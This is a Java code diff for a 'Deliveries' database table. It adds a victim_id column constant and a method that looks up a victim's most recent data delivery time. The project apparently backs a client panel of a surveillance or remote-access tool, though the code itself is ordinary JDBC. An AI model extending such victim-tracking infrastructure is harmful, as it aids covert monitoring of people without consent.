@@ -2,8 +2,10 @@ package com.theah64.xrob.api.database.tables;
 
 import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.models.Delivery;
+import com.theah64.xrob.api.utils.clientpanel.TimeUtils;
 
 import java.sql.PreparedStatement;
+import java.sql.ResultSet;
 import java.sql.SQLException;
 
 /**
@@ -12,6 +14,8 @@ import java.sql.SQLException;
  */
 public class Deliveries extends BaseTable<Delivery> {
 
+    private static final String TABLE_NAME_DELIVERIES = "deliveries";
+    public static final java.lang.String COLUMN_VICTIM_ID = "victim_id";
     private static Deliveries instance = new Deliveries();
 
     private Deliveries() {
@@ -21,10 +25,6 @@ public class Deliveries extends BaseTable<Delivery> {
         return instance;
     }
 
-    @Override
-    public Delivery get(String column, String value) {
-        return null;
-    }
 
     @Override
     public boolean add(Delivery delivery) {
@@ -66,5 +66,39 @@ public class Deliveries extends BaseTable<Delivery> {
         if (!add(delivery)) {
             throw new RuntimeException("Failed to add delivery details");
         }
+    }
+
+    @Override
+    public String get(String byColumn, String byValues, String columnToReturn) {
+        return getV2(TABLE_NAME_DELIVERIES, byColumn, byValues, columnToReturn);
+    }
+
+    public String getLastDeliveryTime(String theVictimId) {
+        final String query = "SELECT UNIX_TIMESTAMP(created_at) AS unix_epoch FROM deliveries WHERE victim_id = ? ORDER BY id DESC LIMIT 1";
+
+        String relativeTime = null;
+        final java.sql.Connection connection = Connection.getConnection();
+
+        try {
+            final PreparedStatement ps = connection.prepareStatement(query);
+            ps.setString(1, theVictimId);
+            final ResultSet rs = ps.executeQuery();
+
+            if (rs.first()) {
+                relativeTime = TimeUtils.getRelativeTime(rs.getLong(COLUMN_AS_UNIX_EPOCH));
+            }
+            rs.close();
+            ps.close();
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                connection.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+
+        return relativeTime;
     }
 }
